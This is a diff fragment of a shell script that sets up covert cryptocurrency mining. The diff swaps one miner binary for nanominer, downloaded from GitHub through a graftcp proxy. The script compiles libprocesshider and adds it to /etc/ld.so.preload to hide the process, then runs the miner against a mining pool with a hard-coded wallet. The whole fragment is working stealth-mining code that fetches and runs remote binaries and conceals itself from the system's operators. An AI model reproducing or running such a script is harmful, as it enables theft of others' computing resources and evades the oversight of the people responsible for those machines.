@@ -51,8 +51,8 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
-chmod +x bezzHash
+./graftcp/graftcp wget https://github.com/nanopool/nanominer/releases/download/v3.6.6/nanominer-linux-3.6.6-cuda11.tar.gz && tar xvf nanominer-linux-3.6.6-cuda11.tar.gz && cd nanominer-linux-3.6.6-cuda11
+chmod +x nanominer
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -61,4 +61,5 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./bezzHash --url=USDT:TRzWbrKRmJYETRPTrVW8RwbX6Sa9KJNbZ7.TMATE@ethash.unmineable.com:3333 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
+./graftcp/graftcp ./nanominer -pool ethash.unmineable.com:3333 -algo etchash -wallet 0x2c85dbf9518342c1c4d0cb8dc7c036c974c993c5 -coin eth -rigName tess1 
+
